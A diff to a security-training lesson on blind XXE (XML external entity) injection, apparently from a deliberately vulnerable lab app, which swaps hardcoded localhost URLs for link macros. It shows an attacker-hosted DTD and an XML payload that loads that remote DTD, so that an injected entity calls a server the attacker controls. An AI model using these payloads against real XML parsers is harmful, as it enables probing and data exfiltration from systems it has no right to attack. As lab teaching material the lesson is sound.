@@ -1,4 +1,3 @@
-
 == Blind XXE
 
 In some cases you will see no output because although your attack might have worked the field is not reflected in the output of page.
@@ -6,25 +5,25 @@ Or the resource you are trying to read contains illegal XML character which caus
 Let's start with an example, in this case we reference an external DTD which we control on our own server.
 
 As an attacker you have WebWolf under your control (*this can be any server under your control.*), you can for example
-use this server to ping it using `http://localhost:8081/ping?text=HelloWorld
+use this server to ping it using `webWolfLink:landing[noLink]`
 
 How do we use this endpoint to verify whether we can perform XXE?
 
 We can again use WebWolf to host a file called `attack.dtd`, create this file with the following contents:
 
-[source]
+[source, subs="macros, specialcharacters"]
 ----
 <?xml version="1.0" encoding="UTF-8"?>
-<!ENTITY ping SYSTEM 'http://localhost:8081/ping?text=HelloWorld'>
+<!ENTITY ping SYSTEM 'webWolfLink:landing[noLink]'>
 ----
 
 Now submit the form change the xml using to:
 
-[source]
+[source, subs="macros, specialcharacters"]
 ----
 <?xml version="1.0"?>
 <!DOCTYPE root [
-<!ENTITY % remote SYSTEM "http://localhost:8081/WebWolf/files/attack.dtd">
+<!ENTITY % remote SYSTEM "webWolfLink:files/attack.dtd[noLink]">
 %remote;
 ]>
 <comment>
